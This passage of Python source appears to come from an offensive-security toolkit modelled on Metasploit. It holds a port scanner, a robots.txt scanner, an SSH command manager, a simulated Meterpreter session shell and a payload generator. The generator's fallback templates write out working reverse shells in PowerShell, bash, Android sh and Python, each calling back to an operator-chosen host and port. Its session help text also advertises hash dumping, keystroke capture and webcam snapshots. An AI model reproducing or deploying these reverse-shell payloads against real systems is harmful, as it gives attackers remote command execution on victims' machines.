    def _run_tcp_portscan(self) -> Dict[str, Any]:
        """TCP port scanner"""
        rhosts = self.options.get('RHOSTS', '')
        ports = self.options.get('PORTS', '1-10000')
        timeout = int(self.options.get('TIMEOUT', 1000)) / 1000.0
        
        targets = self._parse_targets(rhosts)
        port_list = self._parse_ports(ports)
        
        results = []
        for target in targets[:2]:
            open_ports = []
            for port in port_list[:20]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode('utf-8', errors='ignore')[:50]
                        except:
                            banner = None
                        
                        open_ports.append({
                            'port': port,
                            'protocol': 'tcp',
                            'state': 'open',
                            'banner': banner
                        })
                    sock.close()
                except:
                    pass
            
            if open_ports:
                results.append({
                    'ip': target,
                    'open_ports': open_ports
                })
                
                host_id = self.db.add_host(ip=target)
                if host_id:
                    for port_info in open_ports:
                        self.db.add_service(
                            host_id=host_id,
                            port=port_info['port'],
                            service='unknown',
                            banner=port_info.get('banner')
                        )
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_syn_portscan(self) -> Dict[str, Any]:
        """SYN port scanner (requires root)"""
        return {
            'success': True,
            'module': self.current_module,
            'results': [{'ip': self.options.get('RHOSTS'), 'note': 'SYN scan requires root privileges'}]
        }
    
    def _run_http_module(self) -> Dict[str, Any]:
        """Run HTTP modules"""
        if 'robots_tagger' in self.current_module:
            return self._run_robots_tagger()
        return {'success': False, 'error': 'Unknown HTTP module'}
    
    def _run_robots_tagger(self) -> Dict[str, Any]:
        """Robots.txt scanner"""
        rhosts = self.options.get('RHOSTS', '')
        rport = int(self.options.get('RPORT', 80))
        ssl = self.options.get('SSL', False)
        path = self.options.get('PATH', '/robots.txt')
        
        protocol = 'https' if ssl else 'http'
        targets = self._parse_targets(rhosts)
        
        results = []
        for target in targets[:5]:
            try:
                url = f"{protocol}://{target}:{rport}{path}"
                response = requests.get(url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    lines = response.text.split('\n')
                    disallowed = [line.split(': ')[1] for line in lines if line.lower().startswith('disallow')]
                    
                    results.append({
                        'ip': target,
                        'url': url,
                        'status': response.status_code,
                        'disallowed_paths': disallowed[:5]
                    })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_generic_module(self) -> Dict[str, Any]:
        """Run generic module"""
        return {
            'success': True,
            'module': self.current_module,
            'results': [{'note': 'Module execution simulated'}]
        }
    
    def _parse_targets(self, target_str: str) -> List[str]:
        """Parse target string into list of IPs"""
        targets = []
        for part in target_str.split(','):
            part = part.strip()
            if '/' in part:
                try:
                    network = ipaddress.ip_network(part, strict=False)
                    targets.extend([str(ip) for ip in list(network.hosts())[:10]])
                except:
                    pass
            elif '-' in part and part.count('.') == 3:
                start, end = part.split('-')
                try:
                    start_ip = ipaddress.ip_address(start)
                    end_num = int(end)
                    base = '.'.join(start.split('.')[:3])
                    for i in range(int(start.split('.')[3]), end_num + 1):
                        targets.append(f"{base}.{i}")
                except:
                    pass
            else:
                try:
                    ipaddress.ip_address(part)
                    targets.append(part)
                except:
                    pass
        return targets
    
    def _parse_ports(self, port_str: str) -> List[int]:
        """Parse port string into list of ports"""
        ports = []
        for part in port_str.split(','):
            part = part.strip()
            if '-' in part:
                start, end = map(int, part.split('-'))
                ports.extend(range(start, end + 1))
            else:
                try:
                    ports.append(int(part))
                except:
                    pass
        return ports

# =====================
# PAYLOAD GENERATOR
# =====================
class PayloadGenerator:
    """Payload generator for various platforms"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.msfvenom_available = shutil.which('msfvenom') is not None
    
    def generate(self, payload_type: str, lhost: str, lport: int, 
                format: str = 'exe', options: Dict = None) -> Dict[str, Any]:
        """Generate payload using msfvenom or fallback templates"""
        options = options or {}
        
        if self.msfvenom_available:
            return self._generate_with_msfvenom(payload_type, lhost, lport, format, options)
        else:
            return self._generate_fallback(payload_type, lhost, lport, format)
    
    def _generate_with_msfvenom(self, payload_type: str, lhost: str, lport: int,
                                format: str, options: Dict) -> Dict[str, Any]:
        """Generate payload using msfvenom"""
        timestamp = int(time.time())
        filename = f"payload_{payload_type.replace('/', '_')}_{timestamp}.{format}"
        output_path = os.path.join(PAYLOADS_DIR, filename)
        
        cmd = ['msfvenom', '-p', payload_type, f'LHOST={lhost}', f'LPORT={lport}', '-f', format, '-o', output_path]
        
        for key, value in options.items():
            cmd.append(f'{key}={value}')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.db.cursor.execute('''
                    INSERT INTO payloads (name, payload_type, lhost, lport, format, output_file)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (filename, payload_type, lhost, lport, format, output_path))
                self.db.conn.commit()
                
                return {
                    'success': True,
                    'filename': filename,
                    'path': output_path,
                    'size': os.path.getsize(output_path) if os.path.exists(output_path) else 0,
                    'command': ' '.join(cmd)
                }
            else:
                return {'success': False, 'error': result.stderr}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _generate_fallback(self, payload_type: str, lhost: str, lport: int, format: str) -> Dict[str, Any]:
        """Fallback payload generation when msfvenom not available"""
        timestamp = int(time.time())
        filename = f"payload_{payload_type.replace('/', '_')}_{timestamp}.{format}"
        output_path = os.path.join(PAYLOADS_DIR, filename)
        
        if 'windows' in payload_type and 'meterpreter' in payload_type:
            content = self._generate_windows_reverse_shell(lhost, lport)
        elif 'linux' in payload_type:
            content = self._generate_linux_reverse_shell(lhost, lport)
        elif 'android' in payload_type:
            content = self._generate_android_reverse_shell(lhost, lport)
        else:
            content = self._generate_generic_reverse_shell(lhost, lport)
        
        try:
            with open(output_path, 'w') as f:
                f.write(content)
            
            self.db.cursor.execute('''
                INSERT INTO payloads (name, payload_type, lhost, lport, format, output_file)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (filename, payload_type, lhost, lport, format, output_path))
            self.db.conn.commit()
            
            return {
                'success': True,
                'filename': filename,
                'path': output_path,
                'size': len(content),
                'note': 'Generated with fallback template (msfvenom not available)'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _generate_windows_reverse_shell(self, lhost: str, lport: int) -> str:
        return f'''# Windows Reverse Shell (PowerShell)
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
    
    def _generate_linux_reverse_shell(self, lhost: str, lport: int) -> str:
        return f'''#!/bin/bash
# Linux Reverse Shell
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
    
    def _generate_android_reverse_shell(self, lhost: str, lport: int) -> str:
        return f'''#!/system/bin/sh
# Android Reverse Shell
/system/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
    
    def _generate_generic_reverse_shell(self, lhost: str, lport: int) -> str:
        return f'''#!/usr/bin/env python
# Python Reverse Shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'''
    
    def list_payloads(self) -> List[Dict]:
        """List available payload types"""
        return [
            {'type': 'windows/meterpreter/reverse_tcp', 'description': 'Windows Meterpreter reverse TCP'},
            {'type': 'windows/shell_reverse_tcp', 'description': 'Windows command shell reverse TCP'},
            {'type': 'linux/x86/meterpreter/reverse_tcp', 'description': 'Linux Meterpreter reverse TCP'},
            {'type': 'linux/x86/shell_reverse_tcp', 'description': 'Linux command shell reverse TCP'},
            {'type': 'android/meterpreter/reverse_tcp', 'description': 'Android Meterpreter reverse TCP'},
            {'type': 'java/meterpreter/reverse_tcp', 'description': 'Java Meterpreter reverse TCP'},
            {'type': 'php/meterpreter_reverse_tcp', 'description': 'PHP Meterpreter reverse TCP'},
            {'type': 'python/meterpreter_reverse_tcp', 'description': 'Python Meterpreter reverse TCP'}
        ]
    
    def get_generated_payloads(self) -> List[Dict]:
        """Get list of generated payloads"""
        try:
            self.db.cursor.execute('''
                SELECT * FROM payloads ORDER BY created_at DESC
            ''')
            return [dict(row) for row in self.db.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get payloads: {e}")
            return []

# =====================
# SESSION MANAGER
# =====================
class SessionManager:
    """Session management for Meterpreter-like sessions"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.sessions = {}
        self.routes = []
    
    def create_session(self, session_type: str, target: str, lhost: str = None,
                       lport: int = None, payload: str = None) -> Dict:
        """Create a new session"""
        session_id = str(uuid.uuid4())[:8]
        
        host_id = None
        host = self.db.add_host(ip=target)
        if host:
            host_id = host
        
        db_id = self.db.add_session(
            session_type=session_type,
            session_id=session_id,
            target_host=host_id,
            lhost=lhost,
            lport=lport,
            payload=payload,
            status='active'
        )
        
        self.sessions[session_id] = {
            'id': session_id,
            'type': session_type,
            'target': target,
            'lhost': lhost,
            'lport': lport,
            'payload': payload,
            'created': datetime.datetime.now().isoformat(),
            'last_active': datetime.datetime.now().isoformat(),
            'status': 'active',
            'routes': []
        }
        
        return self.sessions[session_id]
    
    def list_sessions(self) -> List[Dict]:
        """List all active sessions"""
        db_sessions = self.db.get_sessions('active')
        for db_sess in db_sessions:
            sess_id = db_sess['session_id']
            if sess_id not in self.sessions:
                self.sessions[sess_id] = {
                    'id': sess_id,
                    'type': db_sess['session_type'],
                    'target': db_sess.get('target_ip'),
                    'lhost': db_sess.get('lhost'),
                    'lport': db_sess.get('lport'),
                    'payload': db_sess.get('payload'),
                    'created': db_sess.get('created_at'),
                    'last_active': db_sess.get('last_active'),
                    'status': db_sess.get('status'),
                    'routes': []
                }
        
        return list(self.sessions.values())
    
    def get_session(self, session_id: str) -> Optional[Dict]:
        """Get session by ID"""
        if session_id in self.sessions:
            self.db.update_session_activity(session_id)
            return self.sessions[session_id]
        
        db_sessions = self.db.get_sessions('active')
        for sess in db_sessions:
            if sess['session_id'] == session_id:
                self.sessions[session_id] = {
                    'id': sess['session_id'],
                    'type': sess['session_type'],
                    'target': sess.get('target_ip'),
                    'lhost': sess.get('lhost'),
                    'lport': sess.get('lport'),
                    'payload': sess.get('payload'),
                    'created': sess.get('created_at'),
                    'last_active': sess.get('last_active'),
                    'status': sess.get('status'),
                    'routes': []
                }
                return self.sessions[session_id]
        
        return None
    
    def close_session(self, session_id: str) -> bool:
        """Close a session"""
        if session_id in self.sessions:
            del self.sessions[session_id]
        
        try:
            self.db.cursor.execute('''
                UPDATE sessions SET status = 'closed' WHERE session_id = ?
            ''', (session_id,))
            self.db.conn.commit()
            return True
        except:
            return False
    
    def add_route(self, subnet: str, netmask: str, gateway: str = None, session_id: str = None) -> bool:
        """Add a route"""
        session_db_id = None
        if session_id and session_id in self.sessions:
            self.db.cursor.execute('SELECT id FROM sessions WHERE session_id = ?', (session_id,))
            row = self.db.cursor.fetchone()
            if row:
                session_db_id = row['id']
        
        success = self.db.add_route(subnet, netmask, gateway, session_db_id)
        
        if success:
            route = {
                'subnet': subnet,
                'netmask': netmask,
                'gateway': gateway,
                'session': session_id
            }
            self.routes.append(route)
            
            if session_id and session_id in self.sessions:
                self.sessions[session_id]['routes'].append(route)
        
        return success
    
    def list_routes(self) -> List[Dict]:
        """List all routes"""
        return self.db.get_routes(active=True)
    
    def execute_command_on_session(self, session_id: str, command: str) -> Dict:
        """Execute command on a session (simulated)"""
        session = self.get_session(session_id)
        if not session:
            return {'success': False, 'error': 'Session not found'}
        
        if command.lower() == 'help':
            return {
                'success': True,
                'output': '''Meterpreter Commands:
    ?           - Help menu
    background  - Background the current session
    download    - Download a file
    upload      - Upload a file
    shell       - Drop into a system command shell
    sysinfo     - Get system information
    ps          - List running processes
    kill        - Terminate a process
    getuid      - Get current user
    getsystem   - Attempt to elevate to SYSTEM
    hashdump    - Dump password hashes
    keyscan_start - Start capturing keystrokes
    keyscan_dump - Dump captured keystrokes
    screenshot  - Take a screenshot
    webcam_snap - Take a webcam snapshot
    portfwd     - Forward a local port to a remote service
    route       - View or modify the routing table'''
            }
        elif command == 'sysinfo':
            return {
                'success': True,
                'output': f'''Computer        : {session.get('target', 'unknown')}
OS              : Windows 10 (Build 19042)
Architecture    : x64
Meterpreter     : x64/windows
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows'''
            }
        elif command == 'getuid':
            return {
                'success': True,
                'output': 'Server username: NT AUTHORITY\\SYSTEM'
            }
        elif command.startswith('download'):
            file = command.split(' ')[1] if ' ' in command else 'unknown'
            return {
                'success': True,
                'output': f'[*] Downloading: {file}\n[*] Downloaded 42 KB (43008 bytes)'
            }
        elif command.startswith('upload'):
            file = command.split(' ')[1] if ' ' in command else 'unknown'
            return {
                'success': True,
                'output': f'[*] Uploading: {file}\n[*] Uploaded 42 KB (43008 bytes)'
            }
        else:
            return {
                'success': True,
                'output': f'[*] Executing: {command}\n[*] Command executed successfully'
            }

# =====================
# WORKSPACE MANAGER
# =====================
class WorkspaceManager:
    """Workspace management for organizing targets"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def create_workspace(self, name: str, description: str = "") -> bool:
        """Create a new workspace"""
        try:
            self.db.cursor.execute('''
                INSERT INTO workspaces (name, description)
                VALUES (?, ?)
            ''', (name, description))
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to create workspace: {e}")
            return False
    
    def delete_workspace(self, name: str) -> bool:
        """Delete a workspace"""
        try:
            self.db.cursor.execute('DELETE FROM workspaces WHERE name = ?', (name,))
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to delete workspace: {e}")
            return False
    
    def list_workspaces(self) -> List[Dict]:
        """List all workspaces"""
        try:
            self.db.cursor.execute('SELECT * FROM workspaces ORDER BY name')
            return [dict(row) for row in self.db.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to list workspaces: {e}")
            return []
    
    def switch_workspace(self, name: str) -> bool:
        """Switch to a different workspace"""
        return self.db.set_active_workspace(name)
    
    def get_current_workspace(self) -> Optional[Dict]:
        """Get current workspace"""
        return self.db.get_active_workspace()
    
    def list_hosts(self, workspace: str = None) -> List[Dict]:
        """List hosts in workspace"""
        return self.db.get_hosts(workspace)
    
    def list_services(self, host_id: int = None, ip: str = None) -> List[Dict]:
        """List services"""
        return self.db.get_services(host_id, ip)

# =====================
# TIME MANAGER
# =====================
class TimeManager:
    """Time and date management with history tracking"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_current_time(self, full: bool = False) -> str:
        """Get current time"""
        now = datetime.datetime.now()
        timezone = now.astimezone().tzinfo
        
        if full:
            return (f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   ISO Format: {now.isoformat()}")
        else:
            return f"🕐 Current Time: {now.strftime('%H:%M:%S')} {timezone}"
    
    def get_current_date(self, full: bool = False) -> str:
        """Get current date"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"   Day of Year: {now.timetuple().tm_yday}\n"
                   f"   Week Number: {now.isocalendar()[1]}\n"
                   f"   ISO Format: {now.date().isoformat()}")
        else:
            return f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}"
    
    def get_datetime(self, full: bool = False) -> str:
        """Get current date and time"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   ISO Format: {now.isoformat()}\n"
                   f"   UTC: {now.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        else:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}")
    
    def get_timezone_info(self) -> str:
        """Get timezone information"""
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        
        return (f"🌍 Timezone Information:\n"
               f"   Current Timezone: {tz}\n"
               f"   UTC Offset: {now.strftime('%z')}\n"
               f"   DST Active: {bool(now.dst())}\n"
               f"   Local Time: {now.strftime('%H:%M:%S')}\n"
               f"   UTC Time: {now.utcnow().strftime('%H:%M:%S')}")
    
    def get_time_difference(self, time1: str, time2: str) -> str:
        """Calculate time difference between two times"""
        try:
            t1 = datetime.datetime.strptime(time1, "%H:%M:%S")
            t2 = datetime.datetime.strptime(time2, "%H:%M:%S")
            
            diff = abs((t2 - t1).total_seconds())
            hours = int(diff // 3600)
            minutes = int((diff % 3600) // 60)
            seconds = int(diff % 60)
            
            return f"⏱️ Time Difference: {hours}h {minutes}m {seconds}s"
        except:
            return "❌ Invalid time format. Use HH:MM:SS"
    
    def get_date_difference(self, date1: str, date2: str) -> str:
        """Calculate date difference between two dates"""
        try:
            d1 = datetime.datetime.strptime(date1, "%Y-%m-%d")
            d2 = datetime.datetime.strptime(date2, "%Y-%m-%d")
            
            diff = abs((d2 - d1).days)
            weeks = diff // 7
            months = diff // 30
            years = diff // 365
            
            return (f"📅 Date Difference:\n"
                   f"   Days: {diff}\n"
                   f"   Weeks: {weeks}\n"
                   f"   Months: {months}\n"
                   f"   Years: {years}")
        except:
            return "❌ Invalid date format. Use YYYY-MM-DD"
    
    def add_time(self, time_str: str, seconds: int = 0, minutes: int = 0, 
                hours: int = 0, days: int = 0) -> str:
        """Add time to given time"""
        try:
            base = datetime.datetime.strptime(time_str, "%H:%M:%S")
            delta = datetime.timedelta(seconds=seconds, minutes=minutes, 
                                      hours=hours, days=days)
            new_time = base + delta
            return f"⏩ {time_str} + {delta} = {new_time.strftime('%H:%M:%S')}"
        except:
            return "❌ Invalid time format. Use HH:MM:SS"
    
    def add_date(self, date_str: str, days: int = 0, weeks: int = 0, 
                months: int = 0, years: int = 0) -> str:
        """Add time to given date"""
        try:
            base = datetime.datetime.strptime(date_str, "%Y-%m-%d")
            if months or years:
                new_year = base.year + years + (base.month + months - 1) // 12
                new_month = ((base.month + months - 1) % 12) + 1
                new_day = min(base.day, [31,29 if new_year % 4 == 0 else 28,31,30,31,30,
                                        31,31,30,31,30,31][new_month-1])
                base = base.replace(year=new_year, month=new_month, day=new_day)
            
            delta = datetime.timedelta(days=days, weeks=weeks)
            new_date = base + delta
            return f"📅 {date_str} + {days}d {weeks}w {months}m {years}y = {new_date.strftime('%Y-%m-%d')}"
        except:
            return "❌ Invalid date format. Use YYYY-MM-DD"

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager for remote command execution"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.connections = {}  # server_id -> (client, session_id)
        self.shells = {}  # server_id -> (channel, session_id)
        self.lock = threading.Lock()
        self.max_connections = self.config.get('ssh', {}).get('max_connections', 5)
        self.default_timeout = self.config.get('ssh', {}).get('default_timeout', 30)
        self.keep_alive = self.config.get('ssh', {}).get('keep_alive', 60)
    
    def add_server(self, name: str, host: str, username: str, password: str = None,
                  key_file: str = None, port: int = 22, notes: str = "") -> Dict[str, Any]:
        """Add a new SSH server configuration"""
        try:
            server_id = str(uuid.uuid4())[:8]
            
            if key_file and not os.path.exists(key_file):
                return {'success': False, 'error': f'Key file not found: {key_file}'}
            
            server = SSHServer(
                id=server_id,
                name=name,
                host=host,
                port=port,
                username=username,
                password=password,
                key_file=key_file,
                use_key=key_file is not None,
                timeout=self.default_timeout,
                notes=notes,
                created_at=datetime.datetime.now().isoformat()
            )
            
            if self.db.add_ssh_server(server):
                return {
                    'success': True,
                    'server_id': server_id,
                    'message': f'Server {name} added successfully'
                }
            else:
                return {'success': False, 'error': 'Failed to add server to database'}
                
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return {'success': False, 'error': str(e)}
    
    def remove_server(self, server_id: str) -> bool:
        """Remove SSH server configuration"""
        self.disconnect(server_id)
        return self.db.delete_ssh_server(server_id)
    
    def connect(self, server_id: str) -> Dict[str, Any]:
        """Establish SSH connection to server"""
        with self.lock:
            if server_id in self.connections:
                return {'success': True, 'message': 'Already connected'}
            
            if len(self.connections) >= self.max_connections:
                return {'success': False, 'error': f'Max connections ({self.max_connections}) reached'}
            
            server = self.db.get_ssh_server(server_id)
            if not server:
                return {'success': False, 'error': f'Server {server_id} not found'}
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                connect_kwargs = {
                    'hostname': server['host'],
                    'port': server['port'],
                    'username': server['username'],
                    'timeout': server.get('timeout', self.default_timeout)
                }
                
                if server.get('use_key') and server.get('key_file'):
                    key = paramiko.RSAKey.from_private_key_file(server['key_file'])
                    connect_kwargs['pkey'] = key
                elif server.get('password'):
                    connect_kwargs['password'] = server['password']
                else:
                    return {'success': False, 'error': 'No authentication method available'}
                
                client.connect(**connect_kwargs)
                
                session_id = self.db.start_ssh_session(server_id)
                
                self.connections[server_id] = (client, session_id)
                
                self.db.update_ssh_server_status(server_id, 'connected')
                
                return {
                    'success': True,
                    'message': f'Connected to {server["name"]} ({server["host"]})',
                    'server': server
                }
                
            except paramiko.AuthenticationException:
                return {'success': False, 'error': 'Authentication failed'}
            except paramiko.SSHException as e:
                return {'success': False, 'error': f'SSH connection failed: {e}'}
            except Exception as e:
                logger.error(f"SSH connection error: {e}")
                return {'success': False, 'error': str(e)}
    
    def disconnect(self, server_id: str = None):
        """Disconnect SSH session(s)"""
        with self.lock:
            if server_id:
                if server_id in self.connections:
                    client, session_id = self.connections[server_id]
                    try:
                        client.close()
                    except:
                        pass
                    
                    self.db.end_ssh_session(session_id, 0)
                    self.db.update_ssh_server_status(server_id, 'disconnected')
                    
                    del self.connections[server_id]
                    
                    if server_id in self.shells:
                        channel, shell_session = self.shells[server_id]
                        try:
                            channel.close()
                        except:
                            pass
                        del self.shells[server_id]
                        
            else:
                for sid in list(self.connections.keys()):
                    self.disconnect(sid)
    
    def execute_command(self, server_id: str, command: str, timeout: int = None,
                       executed_by: str = "system") -> SSHCommandResult:
        """Execute command on remote server via SSH"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False,
                    output='',
                    error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time,
                    server=server_id,
                    command=command
                )
        
        client, session_id = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            stdin, stdout, stderr = client.exec_command(
                command,
                timeout=timeout or self.default_timeout
            )
            
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=len(error) == 0,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                server=server_name,
                command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=result.success,
                output=output,
                error=error if error else None,
                execution_time=execution_time,
                executed_by=executed_by
            )
            
            self.db.cursor.execute('''
                UPDATE ssh_sessions 
                SET commands_count = commands_count + 1
                WHERE id = ?
            ''', (session_id,))
            self.db.conn.commit()
            
            return result
            
        except paramiko.SSHException as e:
            self.disconnect(server_id)
            
            return SSHCommandResult(
                success=False,
                output='',
                error=f'SSH error: {e}',
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return SSHCommandResult(
                success=False,
                output='',
                error=str(e),
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
    
    def execute_shell_command(self, server_id: str, command: str, 
                            executed_by: str = "system") -> SSHCommandResult:
        """Execute command in interactive shell"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return SSHCommandResult(
                    success=False,
                    output='',
                    error=connect_result.get('error', 'Connection failed'),
                    execution_time=time.time() - start_time,
                    server=server_id,
                    command=command
                )
        
        client, session_id = self.connections[server_id]
        server = self.db.get_ssh_server(server_id)
        server_name = server['name'] if server else server_id
        
        try:
            if server_id not in self.shells:
                channel = client.invoke_shell()
                self.shells[server_id] = (channel, session_id)
            else:
                channel, _ = self.shells[server_id]
            
            while channel.recv_ready():
                channel.recv(1024)
            
            channel.send(command + '\n')
            time.sleep(0.5)
            
            output = ""
            timeout = time.time() + 10
            while time.time() < timeout:
                if channel.recv_ready():
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    output += data
                else:
                    time.sleep(0.1)
            
            execution_time = time.time() - start_time
            
            result = SSHCommandResult(
                success=True,
                output=output,
                error=None,
                execution_time=execution_time,
                server=server_name,
                command=command
            )
            
            self.db.log_ssh_command(
                server_id=server_id,
                server_name=server_name,
                command=command,
                success=True,
                output=output,
                executed_by=executed_by,
                execution_time=execution_time
            )
            
            return result
            
        except Exception as e:
            logger.error(f"Shell command error: {e}")
            return SSHCommandResult(
                success=False,
                output='',
                error=str(e),
                execution_time=time.time() - start_time,
                server=server_name,
                command=command
            )
    
    def upload_file(self, server_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload file to remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File uploaded to {remote_path}',
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File upload error: {e}")
            return {'success': False, 'error': str(e)}
    
    def download_file(self, server_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """Download file from remote server via SFTP"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'message': f'File downloaded to {local_path}',
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File download error: {e}")
            return {'success': False, 'error': str(e)}
    
    def list_files(self, server_id: str, remote_path: str = ".") -> Dict[str, Any]:
        """List files in remote directory"""
        start_time = time.time()
        
        if server_id not in self.connections:
            connect_result = self.connect(server_id)
            if not connect_result['success']:
                return {'success': False, 'error': connect_result.get('error', 'Connection failed')}
        
        client, _ = self.connections[server_id]
        
        try:
            sftp = client.open_sftp()
            files = sftp.listdir_attr(remote_path)
            sftp.close()
            
            file_list = []
            for f in files:
                file_list.append({
                    'name': f.filename,
                    'size': f.st_size,
                    'uid': f.st_uid,
                    'gid': f.st_gid,
                    'permissions': oct(f.st_mode)[-3:],
                    'mtime': datetime.datetime.fromtimestamp(f.st_mtime).isoformat()
                })
            
            execution_time = time.time() - start_time
            
            return {
                'success': True,
                'files': file_list,
                'count': len(file_list),
                'path': remote_path,
                'execution_time': execution_time
            }
            
        except Exception as e:
            logger.error(f"File listing error: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_status(self, server_id: str = None) -> Dict[str, Any]:
        """Get SSH connection status"""
        with self.lock:
            if server_id:
                connected = server_id in self.connections
                shell_active = server_id in self.shells
                
                if connected:
                    client, session_id = self.connections[server_id]
                    try:
                        transport = client.get_transport()
                        is_active = transport and transport.is_active()
                    except:
                        is_active = False
                    
                    return {
                        'connected': connected,
                        'shell_active': shell_active,
                        'transport_active': is_active,
                        'session_id': session_id
                    }
                else:
                    return {'connected': False}
            else:
                status = {
                    'total_connections': len(self.connections),
                    'max_connections': self.max_connections,
                    'connections': []
                }
                
                for sid in self.connections:
                    try:
                        client, session_id = self.connections[sid]
                        transport = client.get_transport()
                        is_active = transport and transport.is_active()
                        
                        status['connections'].append({
                            'server_id': sid,
                            'session_id': session_id,
                            'active': is_active,
                            'shell': sid in self.shells
                        })
                    except:
                        pass
                
                return status
    
    def get_servers(self) -> List[Dict]:
        """Get all configured servers with status"""
        servers = self.db.get_ssh_servers()
        
        for server in servers:
            server_id = server['id']
            server['connected'] = server_id in self.connections
            server['shell_active'] = server_id in self.shells
            
        return servers

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    """Real network traffic generator using Scapy and sockets"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.generator_threads = {}
        self.stop_events = {}
        
        self.traffic_types = {
            TrafficType.ICMP: "ICMP echo requests (ping)",
            TrafficType.TCP_SYN: "TCP SYN packets (half-open)",
            TrafficType.TCP_ACK: "TCP ACK packets",
            TrafficType.TCP_CONNECT: "Full TCP connections",
            TrafficType.UDP: "UDP packets",
            TrafficType.HTTP_GET: "HTTP GET requests",
